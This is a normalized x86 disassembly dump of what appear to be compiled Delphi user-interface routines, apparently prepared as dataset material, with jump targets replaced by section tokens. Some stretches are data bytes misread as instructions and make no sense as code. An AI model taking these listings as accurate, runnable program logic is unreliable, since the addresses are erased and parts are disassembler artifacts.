call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_4369ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
and ax 0x1fff
mov [ ebx + 0x20c ] ax
mov al [ r-xdata ]
mov [ ebx + 0x209 ] al
test si 0x2000
je r-xdata
test si 0x4000
je r-xdata
or [ ebx + 0x209 ] 0x1
test si 0x8000
je r-xdata
or [ ebx + 0x209 ] 0x2
pop esi
pop ebx
retn
or [ ebx + 0x209 ] 0x4
sub_4369fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_406ac8
mov [ ebx + 0x209 ] al
mov eax esi
and eax 0xff
mov [ ebx + 0x20c ] ax
test [ ebx + 0x209 ] 0x1
je r-xdata
test [ ebx + 0x209 ] 0x2
je r-xdata
add ax 0x2000
test [ ebx + 0x209 ] 0x4
je r-xdata
add ax 0x4000
pop esi
pop ebx
retn
add ax 0x8000
sub_436a48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x6 ] 0x300
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x212 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_436a7c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_4192f0
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_418f04
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x21 ] 0x3
xor edx edx
mov [ ebp - 0x1d ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x19 ] edx
mov [ ebp - 0x9 ] eax
mov edi esi
mov eax edi
call sub_437058
call sub_450a20
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_418f90
push eax
mov eax edi
call sub_437058
call sub_45071c
lea ecx [ ebp - 0x21 ]
pop edx
call sub_429fa0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_436b24
push ebx
push esi
push edi
push ebp
call sub_403508
mov ebx edx
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_437058
call sub_450a20
test al al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_418f3c
mov eax esi
call sub_437094
test bl bl
jle r-xdata
mov eax ebp
call sub_418f90
push eax
mov eax [ ebp + 0x4 ]
call sub_437058
call sub_45071c
pop edx
call sub_429fb0
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4034f0
sub_436b84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418c98
push ebx
push r-xdata
push ebx
push sub_436bf4
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_436bca
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41cd18
mov eax ebx
call sub_41cc68
mov edx eax
mov eax esi
call sub_436ea0
mov eax ebx
call sub_41cd20
pop esi
pop ebx
retn
sub_436bf4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41ef4c
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_41ee80
mov eax ebx
call sub_41ef54
pop esi
pop ebx
retn
sub_436c18
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_437058
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_450a20
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x289 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41ab48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp - 0x8 ]
mov [ edx + 0x248 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436cfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_41e6c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
call sub_41aae4
retn
sub_436d14
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4192f0
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_418f6c
push ebp
call sub_436c18
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4192f8
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_436d72
inc ebx
add [ ecx ] dl
add ebp [ esi ]
cmp [ esi ] dh
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
call [ eax - 0x75 ]
inc esi
add al 0xe8
dec esp
add al [ eax ]
add al ch
or ebx [ ecx + 0x4d8b0001 ]
cld
insb
jae r-xdata
inc ebp
cld
mov eax [ eax + 0x4 ]
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_436e36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4190b8
mov eax [ esi + 0x4 ]
call sub_4192f0
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_4192f0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4192f0
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_418f6c
push ebp
call sub_436c18
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
pop edx
call sub_42a1b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e3d
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405110
retn
mov eax [ esi + 0x4 ]
call sub_4192f0
push eax
mov eax [ esi + 0x4 ]
call sub_437058
call sub_45071c
mov ecx [ ebp - 0x4 ]
inc edi
xor ebx ebx
inc esi
dec ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4192f8
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4192f8
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_436e44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call sub_40435c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403fa4
mov eax ebx
call sub_436d14
sub_436e6c
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop ebx
retn
mov eax ebx
call sub_418f90
push eax
mov eax [ ebx + 0x4 ]
call sub_437058
call sub_45071c
pop edx
call sub_429fc8
mov [ ebx + 0x24 ] eax
sub_436ea0
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_436d14
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_436ecc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_418f90
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_418f6c
mov eax [ esi + 0x4 ]
call sub_437058
mov edx [ eax ]
call [ edx + 0x80 ]
sub_436f04
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_437058
test eax eax
je r-xdata
mov eax ebx
call sub_436d14
mov eax [ ebx + 0x4 ]
call sub_437058
mov si 0xffee
call sub_403350
sub_436f68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418bac
pop esi
pop ebx
retn
mov dl [ esi + 0xc ]
mov eax ebx
call sub_436ecc
mov dl [ esi + 0xd ]
mov eax ebx
call sub_436f04
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_436e44
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_436f38
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_436f48
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_436f58
mov eax esi
call sub_436e6c
mov edx eax
mov eax ebx
call sub_436ea0
pop esi
pop ebx
retn
sub_436fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403fa4
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418fa8
sub_437000
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4190e8
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_437060
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_437058
call sub_43b6ac
pop esi
pop ebx
retn
mov eax esi
call sub_418f90
push eax
mov eax ebx
call sub_437058
pop edx
call sub_43b6ec
pop esi
pop ebx
retn
sub_437094
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_437058
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43716f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4192f0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_437058
call sub_45071c
mov edx ebx
call sub_429fb0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_437058
call sub_43b6ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437044
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_437058
call sub_45071c
mov ecx edi
mov edx ebx
call sub_429fa0
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437044
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_437180
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418f04
mov [ esi + 0x20 ] 0xff000008
lea eax [ esi + 0x1c ]
call sub_403f50
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4371d8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_403fa4
mov dl 0x1
mov eax ebx
call sub_418f6c
pop esi
pop ebx
retn
sub_437208
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
insb
jae r-xdata
fimul [ ebx + 0x2054e8c7 ]
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
lea eax [ esi + 0x1c ]
call sub_403f50
mov eax esi
test bl bl
je r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_4372d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_403350
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_4192f0
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax edi
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax edi
call sub_4372e0
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
lea esi [ eax + 0xc ]
mov eax edi
call sub_4192f0
push eax
mov eax [ ebp - 0x8 ]
call sub_45071c
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a1f0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4372d9
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405110
retn
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
inc esi
xor ebx ebx
sub_437408
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0x30 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ edi + 0x34 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_437454
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a470
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_437484
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a4cc
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418454
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4375b8
mov eax esi
pop esi
pop ebx
retn
sub_4374ac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a4d8
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_418454
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4375b8
mov eax esi
pop esi
pop ebx
retn
sub_4374e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a5b4
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_4184a0
mov eax [ ebx + 0x30 ]
call sub_43779c
pop esi
pop ebx
retn
sub_437518
push ebx
push esi
mov esi edx
mov eax [ eax + 0x30 ]
call sub_4376cc
mov ebx eax
mov eax ebx
call sub_439a38
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_4192f0
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_43b440
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_43b6ec
sub_43755c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_41a7ec
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x34 ]
call sub_41862c
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_4375b8
inc edi
dec ebx
jne r-xdata
sub_43759c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a8c8
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4375b8
pop esi
pop ebx
retn
sub_4375b8
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x30 ]
call sub_437bec
push eax
mov eax ebx
call sub_43750c
mov ecx esi
pop edx
call sub_42a124
mov edx esi
mov eax ebx
call sub_437518
pop esi
pop ebx
retn
sub_437610
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_437408
mov [ esi + 0x8 ] eax
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_437660
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov [ esi + 0x28 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp esi [ eax + 0x270 ]
jne r-xdata
mov eax esi
call sub_4376cc
call sub_450a20
test al al
je r-xdata
xor edx edx
mov [ eax + 0x270 ] edx
mov eax [ esi + 0x8 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_4376f8
pop edx
call sub_429e90
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_43770c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov al [ esi + 0x2a ]
pop esi
pop ebx
retn
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax esi
call sub_437bec
push eax
mov eax ebx
call sub_45071c
pop edx
call sub_42a0d8
test eax eax
setne al
pop esi
pop ebx
retn
sub_437750
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_43770c
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x2a ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x244 ] 0x0
jne r-xdata
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax edi
call sub_437bec
push eax
mov eax esi
call sub_45071c
mov ecx ebx
pop edx
call sub_42a0f8
sub_4377b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_40435c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_403fa4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_4376cc
call sub_439a38
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_437bec
push eax
mov eax ebx
call sub_4376f8
xor ecx ecx
pop edx
call sub_42a124
mov eax ebx
call sub_4376cc
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_4376cc
mov eax [ eax + 0x23c ]
call sub_4192f0
test eax eax
jle r-xdata
mov eax ebx
call sub_4376cc
call sub_43b1e4
mov eax ebx
call sub_4376cc
xor edx edx
call sub_43b440
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_4376cc
call sub_43b6ac
sub_437868
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_4376cc
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4376cc
call sub_43b1e4
sub al 0x2
jne r-xdata
sub_437898
push ebx
push esi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_4378a8 ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_4376f8
mov ecx ebx
pop edx
call sub_42a0c8
test eax ebx
setne al
pop esi
pop ebx
retn
sub_437900
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_437911 ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_437bec
push eax
mov eax ebx
call sub_4376f8
mov ecx edi
pop edx
call sub_42a098
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_437970
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_437bec
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4376f8
mov edx esp
call sub_429e60
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_4376cc
pop edx
pop ecx
call sub_439338
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_429d84
push eax
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_4376f8
pop edx
pop ecx
call sub_42a098
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_429e44
push eax
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_4376f8
pop edx
pop ecx
call sub_42a098
xor edi edi
sub_437aac
push ebx
add esp 0xffffffd8
mov ebx eax
cmp edx [ ebx + 0x14 ]
je r-xdata
add esp 0x28
pop ebx
retn
mov [ ebx + 0x14 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_437bec
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4376f8
mov edx esp
call sub_429e60
mov eax ebx
call sub_437bec
push eax
mov eax ebx
call sub_437bec
push eax
mov eax ebx
call sub_4376cc
pop edx
pop ecx
call sub_439338
sub_437b18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418bac
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov esi eax
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_4377b8
mov edx [ esi + 0xc ]
mov eax ebx
call sub_437868
mov ecx [ esi + 0x10 ]
xor edx edx
mov eax ebx
call sub_437970
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_437aac
mov ecx [ esi + 0x1c ]
mov edx 0x1
mov eax ebx
call sub_437970
mov ecx [ esi + 0x20 ]
mov edx 0x2
mov eax ebx
call sub_437970
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_437bd8
mov eax esi
call sub_43770c
mov edx eax
mov eax ebx
call sub_437750
pop esi
pop ebx
retn
sub_437bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
call sub_40435c
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_437c08
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_437bec
push eax
mov eax esi
call sub_4376f8
mov ecx edi
pop edx
call sub_429ef0
pop edi
pop esi
pop ebx
retn
sub_437c44
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4375f0
cmp edi eax
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_437604
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_437bec
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_4376f8
mov edx esp
call sub_429e60
sub_437cb0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_437cec
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_437e68
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_437d24
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_438688
push esp
mov eax ebx
call sub_437d98
pop edx
call sub_429e78
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_437d74
mov esi eax
test esi esi
jge r-xdata
sub_437d74
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_450a20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_437d98
call sub_429e34
pop ebx
retn
sub_437da4
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_450a20
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
